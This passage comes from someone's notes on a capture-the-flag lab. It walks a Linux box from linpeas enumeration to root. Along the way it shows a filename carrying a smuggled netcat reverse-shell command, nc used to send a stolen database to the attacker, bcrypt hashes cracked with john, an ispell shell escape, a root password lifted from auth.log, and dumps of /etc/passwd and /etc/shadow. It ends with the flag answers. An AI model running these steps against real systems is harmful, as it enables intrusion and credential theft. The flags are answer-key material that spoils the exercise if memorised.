CapBnd:	0000003fffffffff

Files with capabilities (limited to 50):
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
/bin/ping6 = cap_net_raw+ep
/bin/ping = cap_net_raw+ep

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls
files with acls in searched folders Not Found

╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path
/usr/bin/gettext.sh

╔══════════╣ Unexpected in root
/vmlinuz
/initrd.img

╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files
total 12
drwxr-xr-x  2 root root 4096 Apr 17  2020 .
drwxr-xr-x 90 root root 4096 Jan 26 17:57 ..
-rw-r--r--  1 root root  663 Mar 22  2014 bash_completion.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d

═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No
═╣ Credentials in fstab/mtab? ........... No
═╣ Can I read shadow files? ............. No
═╣ Can I read shadow plists? ............ No
═╣ Can I write shadow plists? ........... No
═╣ Can I read opasswd file? ............. No
Can I write in network-scripts? ...... No
═╣ Can I read root folder? .............. No

╔══════════╣ Searching root files in home dirs (limit 30)
/home/
/root/

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
/run/php
/var/www/html/inc/data

╔══════════╣ Readable files belonging to root and readable by me but not world readable

╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/var/log/kern.log
/var/log/auth.log
/var/log/messages
/var/log/daemon.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/syslog
/var/www/html/tmp/blog.html

╔══════════╣ Writable log files (logrotten) (limit 100)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#logrotate-exploitation

╔══════════╣ Files inside /var/www (limit 20)
total 12
drwxr-xr-x  3 root     root     4096 Apr 17  2020 .
drwxr-xr-x 12 root     root     4096 Apr 23  2020 ..
drwxr-xr-x  8 www-data www-data 4096 Apr 22  2020 html

╔══════════╣ Files inside others home (limit 20)

╔══════════╣ Searching installed mail applications
exim
sendmail

╔══════════╣ Mails (limit 50)

╔══════════╣ Backup folders

╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 39824 Apr 17  2020 /etc/nginx/backup.sql
-rw-r--r-- 1 root root 875 Apr 17  2020 /etc/xml/catalog.old
-rw-r--r-- 1 root root 673 Apr 17  2020 /etc/xml/xml-core.xml.old
-rw-r--r-- 1 root root 339 Apr 17  2020 /etc/xml/docutils-common.xml.old
-rw-r--r-- 1 root root 7824 May  8  2018 /lib/modules/3.16.0-6-amd64/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 10703 Apr 17  2020 /usr/share/info/dir.old
-rw-r--r-- 1 root root 12741 Feb 10  2018 /usr/share/doc/exim4-base/changelog.Debian.old.gz
-rw-r--r-- 1 root root 7867 Jul 22  2008 /usr/share/doc/telnet/README.telnet.old.gz
-rw-r--r-- 1 root root 2862 Aug  1  2018 /usr/share/doc/mutt/NEWS.old.gz
-rw-r--r-- 1 root root 159 Apr 17  2020 /var/lib/sgml-base/supercatalog.old

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /var/lib/apt/listchanges.db: Berkeley DB (Hash, version 9, native byte-order)
Found /var/lib/mlocate/mlocate.db: regular file, no read permission
Found /var/www/html/inc/data/database.db: empty


╔══════════╣ Web files?(output limit)
/var/www/:
total 12K
r-x  3 root     root     4.0K Apr 17  2020 .
drwxr-xr-x 12 root     root     4.0K Apr 23  2020 ..
drwxr-xr-x  8 www-data www-data 4.0K Apr 22  2020 html

/var/www/html:
total 68K
drwxr-xr-x 8 www-data www-data 4.0K Apr 22  2020 .
drwxr-xr-x 3 root     root     4.0K Apr 17  2020 ..

╔══════════╣ All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw------- 1 root root 0 Apr 17  2020 /etc/.pwd.lock
-rw-r--r-- 1 root root 220 Nov  5  2016 /etc/skel/.bash_logout
-rw-r--r-- 1 root root 0 Jan 26 17:57 /run/network/.ifstate.lock
-rw-r--r-- 1 root root 29 Apr 17  2020 /usr/lib/pymodules/python2.7/.path
-rwxr-xr-x 1 root root 623 Feb 19  2019 /usr/share/docker-ce/contrib/mkimage/.febootstrap-minimize
-rwxr-xr-x 1 www-data www-data 231 Feb 19  2020 /var/www/html/admin/.htaccess
-rwxr-xr-x 1 www-data www-data 0 Feb 19  2020 /var/www/html/inc/lang/se_swedish/.lock
-rwxr-xr-x 1 www-data www-data 0 Feb 19  2020 /var/www/html/inc/lang/ru_russian/.lock
-rwxr-xr-x 1 www-data www-data 0 Feb 19  2020 /var/www/html/inc/lang/fr_french/.lock
-rwxr-xr-x 1 www-data www-data 0 Feb 19  2020 /var/www/html/inc/lang/tr_turkish/.lock
-rwxr-xr-x 1 www-data www-data 0 Feb 19  2020 /var/www/html/inc/lang/id_indonesian/.lock
-rwxr-xr-x 1 www-data www-data 0 Feb 19  2020 /var/www/html/inc/lang/nl_dutch/.lock
-rwxr-xr-x 1 www-data www-data 0 Feb 19  2020 /var/www/html/inc/lang/it_italian/.lock
-rwxr-xr-x 1 www-data www-data 0 Feb 19  2020 /var/www/html/inc/lang/es_spanish/.lock
-rwxr-xr-x 1 www-data www-data 67 Feb 19  2020 /var/www/html/uploads/.htaccess

p, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-rwxrwxrwx 1 www-data www-data 777018 Jan  7 21:42 /tmp/linpeas.sh
-rw-r--r-- 1 root root 522 Apr 17  2020 /var/backups/dpkg.diversions.0
-rw-r--r-- 1 root root 522585 Apr 22  2020 /var/backups/dpkg.status.0
-rw-r--r-- 1 root root 61440 Apr 23  2020 /var/backups/alternatives.tar.0
-rw-r--r-- 1 root root 253 Apr 22  2020 /var/backups/dpkg.statoverride.0
-rw-r--r-- 1 root root 18571 Apr 22  2020 /var/backups/apt.extended_states.0

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
/dev/mqueue
/dev/shm
/run/lock
/run/lock/apache2
/run/php
/tmp
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/tmp/.font-unix
#)You_can_write_even_more_files_inside_last_directory

/var/cache/apache2/mod_cache_disk
/var/lib/nginx/body
/var/lib/nginx/fastcgi
/var/lib/nginx/proxy
/var/lib/nginx/proxy/1
/var/lib/nginx/proxy/1/00
/var/lib/nginx/proxy/2
/var/lib/nginx/proxy/2/00
/var/lib/nginx/proxy/3
/var/lib/nginx/proxy/3/00
/var/lib/nginx/proxy/4
/var/lib/nginx/proxy/4/00
/var/lib/nginx/proxy/5
/var/lib/nginx/proxy/5/00
/var/lib/nginx/proxy/6
/var/lib/nginx/proxy/6/00
/var/lib/nginx/proxy/7
/var/lib/nginx/proxy/7/00
/var/lib/nginx/scgi
/var/lib/nginx/uwsgi
/var/lib/php/sessions
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/tmp

╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
  Group www-data:
/tmp/linpeas.sh

╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/bin/systemd-ask-password
/bin/systemd-tty-ask-password-agent
/etc/pam.d/common-password
/usr/lib/git-core/git-credential
/usr/lib/git-core/git-credential-cache
/usr/lib/git-core/git-credential-cache--daemon
/usr/lib/git-core/git-credential-store
  #)There are more creds/passwds files in the previous parent folder

/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/pymodules/python2.7/ndg/httpsclient/test/pki/localhost.key
/usr/share/doc/git/contrib/credential
/usr/share/doc/git/contrib/credential/gnome-keyring/git-credential-gnome-keyring.c
/usr/share/doc/git/contrib/credential/netrc/git-credential-netrc
/usr/share/doc/git/contrib/credential/osxkeychain/git-credential-osxkeychain.c
/usr/share/doc/git/contrib/credential/wincred/git-credential-wincred.c
/usr/share/man/man1/git-credential-cache--daemon.1.gz
/usr/share/man/man1/git-credential-cache.1.gz
git-credential-store.1.gz
/usr/share/man/man1/git-credential.1.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/man/man7/gitcredentials.7.gz
/usr/share/man/man8/systemd-ask-password-console.path.8.gz
/usr/share/man/man8/systemd-ask-password-console.service.8.gz
/usr/share/man/man8/systemd-ask-password-wall.path.8.gz
/usr/share/man/man8/systemd-ask-password-wall.service.8.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/pam/common-password.md5sums
/usr/share/pyshared/ndg/httpsclient/test/pki/localhost.key
/var/cache/debconf/passwords.dat
/var/lib/pam/password

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs

╔══════════╣ Searching passwords inside logs (limit 70)
192.168.66.253 - - [22/Apr/2020:11:05:21 -0500] "GET /P02rmMLv.pwd HTTP/1.1" 200 187 "-" "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:map_codes)"
192.168.66.253 - - [22/Apr/2020:11:05:22 -0500] "GET /P02rmMLv.PWD HTTP/1.1" 200 632 "-" "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:map_codes)"
192.168.66.253 - - [22/Apr/2020:11:05:25 -0500] "GET /guestbook/pwd HTTP/1.1" 200 215 "-" "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000044)"
192.168.66.253 - - [22/Apr/2020:11:05:25 -0500] "GET /password.inc HTTP/1.1" 200 1141 "-" "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000163)"
192.168.66.253 - - [22/Apr/2020:11:05:26 -0500] "GET /LOGIN.PWD HTTP/1.1" 200 178 "-" "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000436)"
192.168.66.253 - - [22/Apr/2020:11:05:27 -0500] "GET /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1" 400 172 "-" "-"
192.168.66.253 - - [22/Apr/2020:11:05:27 -0500] "GET /%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1" 400 172 "-" "-"
192.168.66.253 - - [22/Apr/2020:11:05:27 -0500] "GET /../../../../../../../../../../etc/passwd HTTP/1.1" 400 172 "-" "-"
192.168.66.253 - - [22/Apr/2020:11:05:27 -0500] "GET ///etc/passwd HTTP/1.1" 200 194 "-" "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000543)"
192.168.66.253 - - [22/Apr/2020:11:05:27 -0500] "GET /DomainFiles/*//../../../../../../../../../../etc/passwd HTTP/1.1" 400 172 "-" "-"
192.168.66.253 - - [22/Apr/2020:11:05:28 -0500] "GET /chat/!pwds.txt HTTP/1.1" 200 262 "-" "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000993)"
2020-04-17 14:13:56 configure base-passwd:amd64 3.5.37 3.5.37
2020-04-17 14:13:56 install base-passwd:amd64 <none> 3.5.37
2020-04-17 14:13:56 status half-configured base-passwd:amd64 3.5.37
2020-04-17 14:13:56 status half-installed base-passwd:amd64 3.5.37
31mpasswd:amd64 3.5.37atus installed base-
2020-04-17 14:13:56 status unpacked base-passwd:amd64 3.5.37
2020-04-17 14:14:10 status half-configured base-passwd:amd64 3.5.37
2020-04-17 14:14:10 status half-installed base-passwd:amd64 3.5.37
2020-04-17 14:14:10 status unpacked base-passwd:amd64 3.5.37
2020-04-17 14:14:10 upgrade base-passwd:amd64 3.5.37 3.5.37
2020-04-17 14:14:20 install passwd:amd64 <none> 1:4.2-3+deb8u4
1mpasswd:amd64 1:4.2-3+deb8u4lf-installed 
2020-04-17 14:14:22 status unpacked passwd:amd64 1:4.2-3+deb8u4
2020-04-17 14:14:35 configure base-passwd:amd64 3.5.37 <none>
2020-04-17 14:14:35 status half-configured base-passwd:amd64 3.5.37
2020-04-17 14:14:35 status installed base-passwd:amd64 3.5.37
2020-04-17 14:14:35 status unpacked base-passwd:amd64 3.5.37
2020-04-17 14:14:36 configure passwd:amd64 1:4.2-3+deb8u4 <none>
2020-04-17 14:14:36 status half-configured passwd:amd64 1:4.2-3+deb8u4
2020-04-17 14:14:36 status installed passwd:amd64 1:4.2-3+deb8u4
2020-04-17 14:14:36 status unpacked passwd:amd64 1:4.2-3+deb8u4
Description: Set up users and passwords

www-data@Durius:/tmp$ cd /var/www/html/inc/data/
cd /var/www/html/inc/data/
www-data@Durius:~/html/inc/data$ ls
ls
database.db
database.sdb

www-data@Durius:~/html/inc/data$ ls -lah
ls -lah
total 48K
drwxr-xr-x 2 www-data www-data 4.0K Jan 26 18:06 .
drwxr-xr-x 9 www-data www-data 4.0K Feb 19  2020 ..
-rwxr-xr-x 1 www-data www-data    0 Feb 19  2020 .gitkeep
-rw-r--r-- 1 root     root        0 Apr 22  2020 database.db
-rw-r--r-- 1 www-data www-data  39K Jan 26 18:06 database.sdb

┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ nc -nvlp 7777 > database.sdb
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::7777
Ncat: Listening on 0.0.0.0:7777
Ncat: Connection from 10.10.31.131.
Ncat: Connection from 10.10.31.131:41419.
^C

www-data@Durius:~/html/inc/data$ nc 10.8.19.103 7777 < database.sdb
nc 10.8.19.103 7777 < database.sdb

┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ ls -lah
total 84K
drwxr-xr-x  2 kali kali 4.0K Jan 26 19:43  .
drwxr-xr-x 83 kali kali  12K Jan 26 12:24  ..
-rw-r--r--  1 kali kali   10 Jan 26 12:54 'a.txt;nc 168301415 443 -e sh'
-rw-r--r--  1 kali kali  39K Jan 26 19:45  database.sdb
-rw-r--r--  1 kali kali  16K Jan 26 18:47  ferox-http_newcms_mofo_pwn:8888_-1674776830.state
-rw-r--r--  1 kali kali  290 Jan 26 13:57  ftp.py
-rw-r--r--  1 kali kali  207 Jan 26 16:10  shell.elf

┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ file database.sdb             
database.sdb: SQLite 3.x database, last written using SQLite version 3008007, page size 1024, file counter 158, database pages 39, 1st free page 33, free pages 2, cookie 0xe, schema 4, UTF-8, version-valid-for 158

┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ sqlite3 database.sdb                                    
SQLite version 3.40.0 2022-11-16 12:10:08
Enter ".help" for usage hints.
sqlite> .tables
blog                    login_attempts          remember_me           
blog_tags               modules                 settings              
blog_tags_relationship  navs                    snippets              
galleries               navs_items              users                 
galleries_items         pages                 
sqlite> select * from users;
1|admin|Hugh Gant|My name is Hugh Gant. Da boss|$2y$10$HvIMAjTHGJXVeVyua.SxWum6ASmouY2svALXkZludVLPzvMbAAely|avatar5ea1f73cdf267.png|admin@mofo.pwn|admin|all
2|Ben|Clower||$2y$10$KSWWopGZdJhqP3iq8juuauMyNZjA8S8X/49lr7XntZKXsuWRUgaFC|avatar5ea05e10750a9.png|benclower@mofo.pwn|admin|all
sqlite> .exit

┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash      
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
divisionminuscula (?)     
1g 0:00:37:33 DONE (2023-01-26 20:29) 0.000443g/s 71.27p/s 71.27c/s 71.27C/s doglas..diva89
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

after 30 min



www-data@Durius:/home$ python -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@Durius:/home$ su benclower
su benclower
Password: divisionminuscula

benclower@Durius:/home$ ls
ls
benclower  me
benclower@Durius:/home$ cd benclower
cd benclower
benclower@Durius:~$ ls
ls
flag1.txt
benclower@Durius:~$ cat flag1.txt
cat flag1.txt
THM{Nice_Work_Got_Ben_Clower}

-rwxr-sr-x 1 root adm 88K Dec 12  2012 /usr/bin/ispell

SGID (Set Group ID) is a Unix/Linux file permission that allows a file or directory to run with the permissions of its group owner, rather than the permissions of the user who runs it. This means that any files or subdirectories created within the directory will also belong to the group owner and will have the same group permissions. This can be useful in a shared environment where multiple users need access to the same files or directories. The command to set SGID on a file or directory is "chmod g+s [file/directory]."

ispell is a command-line spell-checking program that was first developed in the 1970s. It is available for many different operating systems and can be used to check the spelling of text files or input from the user. It is commonly used to check the spelling of text written in languages such as English, French, and Spanish. It can also be used to create custom dictionaries for specific fields or industries.

┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ echo "this is a test" | ispell 

@(#) International Ispell Version 3.4.05 11 Mar 2022
word: ok
ok
ok
ok

┌──(kali㉿kali)-[~/Downloads/time_flies]
└─$ ispell /bin/bash (anything)

then !ls (read)

!sh (bash)



╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/var/log/kern.log
/var/log/auth.log


benclower@Durius:/home$ ispell /bin/bash
ispell /bin/bash
Screen too small:  need at least 10 lines
Warning:  Can't write to /bin/bash
    dH              File: /bin/bash [READONLY]



[SP] <number> R)epl A)ccept I)nsert L)ookup U)ncap Q)uit e(X)it or ? for help
!ls
!ls
benclower  me

-- Type space to continue --    
    dH              File: /bin/bash [READONLY]



[SP] <number> R)epl A)ccept I)nsert L)ookup U)ncap Q)uit e(X)it or ? for help
    �A              File: /bin/bash [READONLY]



[SP] <number> R)epl A)ccept I)nsert L)ookup U)ncap Q)uit e(X)it or ? for help
    NR              File: /bin/bash [READONLY]



[SP] <number> R)epl A)ccept I)nsert L)ookup U)ncap Q)uit e(X)it or ? for help
    �F              File: /bin/bash [READONLY]



[SP] <number> R)epl A)ccept I)nsert L)ookup U)ncap Q)uit e(X)it or ? for help
!sh
!sh
$ cat /var/log/auth.log | grep password
cat /var/log/auth.log | grep password
Apr 17 09:19:36 CarpeDiem1 sshd[716]: Accepted password for me from 192.168.225.1 port 62930 ssh2
Apr 17 09:41:34 CarpeDiem1 sshd[10163]: Accepted password for me from 192.168.225.1 port 63510 ssh2
Apr 17 09:54:41 CarpeDiem1 sshd[2073]: Accepted password for me from 192.168.225.1 port 63805 ssh2
Apr 22 06:35:22 CarpeDiem1 sshd[2566]: Accepted password for me from 192.168.66.1 port 50538 ssh2
Apr 22 06:46:15 Durius sshd[1160]: Accepted password for me from 192.168.66.1 port 51004 ssh2
Apr 22 06:54:34 Durius sshd[1205]: Accepted password for me from 192.168.66.1 port 51219 ssh2
Apr 22 07:03:24 Durius sshd[1251]: Accepted password for me from 192.168.66.1 port 51388 ssh2
Apr 22 09:10:36 Durius sshd[16979]: Accepted password for me from 192.168.66.1 port 54602 ssh2
Apr 22 09:13:28 Durius sshd[16989]: Accepted password for me from 192.168.66.1 port 54637 ssh2
Apr 22 09:13:43 Durius sshd[16992]: Accepted password for me from 192.168.66.1 port 54642 ssh2
Apr 22 09:49:43 Durius sshd[1324]: Accepted password for me from 192.168.66.1 port 55557 ssh2
Apr 22 09:57:52 Durius sshd[1295]: Accepted password for me from 192.168.66.1 port 55693 ssh2
Apr 22 10:06:18 Durius sshd[1599]: Accepted password for me from 192.168.66.1 port 55883 ssh2
Apr 22 10:10:04 Durius passwd[1903]: pam_unix(passwd:chauthtok): password changed for bendover
Apr 22 14:57:29 Durius sshd[7947]: Accepted password for me from 192.168.66.1 port 63898 ssh2
Apr 22 15:00:53 Durius sshd[7950]: Accepted password for me from 192.168.66.1 port 64299 ssh2
Apr 22 15:01:08 Durius passwd[7979]: pam_unix(passwd:chauthtok): password changed for bendover
Apr 22 16:55:13 Durius sshd[1526]: Accepted password for me from 192.168.66.1 port 51165 ssh2
Apr 22 17:28:25 Durius sshd[1856]: Accepted password for me from 192.168.66.1 port 52087 ssh2
Apr 22 17:30:24 Durius passwd[1884]: pam_unix(passwd:chauthtok): password changed for root
Apr 22 17:31:29 Durius sshd[1891]: Failed password for invalid user sTertXssd65rfd_sdf from 192.168.66.1 port 52129 ssh2
Apr 22 17:31:29 Durius sshd[1891]: Failed password for invalid user sTertXssd65rfd_sdf from 192.168.66.1 port 52129 ssh2
Apr 23 01:12:27 Durius sshd[2662]: Accepted password for me from 192.168.66.1 port 62962 ssh2
Apr 23 02:45:54 Durius sshd[15237]: Accepted password for mofo from 192.168.66.1 port 65204 ssh2
Apr 23 02:51:26 Durius sshd[15259]: Accepted password for mofo from 192.168.66.1 port 65385 ssh2
Apr 23 02:55:08 Durius sshd[1256]: Accepted passwoApr 23 02:55:08 Durius sshd[1256]: Accepted password for mofo from 192.168.66.1 port 65457 ssh2
Apr 23 11:33:11 Durius sshd[11809]: Accepted password for mofo from 192.168.66.1 port 60235 ssh2
Apr 23 15:11:31 Durius sshd[1443]: Accepted password for me from 192.168.66.1 port 51085 ssh2
Apr 23 15:46:35 Durius sshd[1370]: Accepted password for me from 192.168.66.1 port 52654 ssh2

$ su root
su root
Password: sTertXssd65rfd_sdf

root@Durius:/home# cd /root
cd /root
root@Durius:~# ls
ls
flag2.txt
root@Durius:~# cat flag2.txt
cat flag2.txt
THM{Great_work!_You_Rooted_TempusFugitDurius!}
root@Durius:~# ls -lah
ls -lah
total 28K
drwx------  4 root root 4.0K Apr 23  2020 .
drwxr-xr-x 22 root root 4.0K Apr 17  2020 ..
lrwxrwxrwx  1 root root    9 Apr 22  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
-rw-r--r--  1 root root   47 Apr 23  2020 flag2.txt
drwx------  2 root root 4.0K Apr 23  2020 .gnupg
-rw-r--r--  1 root root  140 Nov 19  2007 .profile
drwx------  2 root root 4.0K Apr 17  2020 .ssh
root@Durius:~# cat .bash_history
cat .bash_history

root@Durius:~# cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
Debian-exim:x:104:109::/var/spool/exim4:/bin/false
statd:x:105:65534::/var/lib/nfs:/bin/false
messagebus:x:106:112::/var/run/dbus:/bin/false
sshd:x:107:65534::/var/run/sshd:/usr/sbin/nologin
me:x:1000:1000:me,,,:/home/me:/bin/bash
benclower:x:1001:1001:Ben Clower,,,:/home/benclower:/bin/bash
root@Durius:~# cat /etc/shadow
cat /etc/shadow
root:$6$gajQUlYj$.vIsgQ.l/7ZCh6xTEbCzf2Ti7k83pZZve7lvHHHmdUrXEKWbCv0UtsgvWRm4QfPuB5Mg4WjW9Y5QcKycyPAAD.:18374:0:99999:7:::
daemon:*:18369:0:99999:7:::
bin:*:18369:0:99999:7:::
sys:*:18369:0:99999:7:::
sync:*:18369:0:99999:7:::
games:*:18369:0:99999:7:::
man:*:18369:0:99999:7:::
lp:*:18369:0:99999:7:::
mail:*:18369:0:99999:7:::
news:*:18369:0:99999:7:::
uucp:*:18369:0:99999:7:::
proxy:*:18369:0:99999:7:::
www-data:*:18369:0:99999:7:::
backup:*:18369:0:99999:7:::
list:*:18369:0:99999:7:::
irc:*:18369:0:99999:7:::
gnats:*:18369:0:99999:7:::
nobody:*:18369:0:99999:7:::
systemd-timesync:*:18369:0:99999:7:::
systemd-network:*:18369:0:99999:7:::
systemd-resolve:*:18369:0:99999:7:::
systemd-bus-proxy:*:18369:0:99999:7:::
Debian-exim:!:18369:0:99999:7:::
statd:*:18369:0:99999:7:::
messagebus:*:18369:0:99999:7:::
sshd:*:18369:0:99999:7:::
me:$6$JMeslftJ$Xd6fu6ugqKxYIsxfBhqPFmb7PaYoH0HIJNX7rB3hepGzJrzjkmBmGvgar9OILwosmNRgwAaXiOcRhWyF8tg53.:18369:0:99999:7:::
benclower:$6$ymSNcGgc$0zCfgdZ9BgY7G04RYaFYMKawc6nO.XoGQLC5XcH39xpLokRsK/koI12FR8u1n5V.hZwr7cz01E8jcYZl06cCZ1:18374:0:99999:7:::


```

![[Pasted image 20230126190959.png]]

![[Pasted image 20230126195648.png]]
![[Pasted image 20230126210011.png]]

What is flag 1?

*THM{Nice_Work_Got_Ben_Clower}*

What is flag 2?

*THM{Great_work!_You_Rooted_TempusFugitDurius!}*


[[OWASP API Security Top 10 - 2]]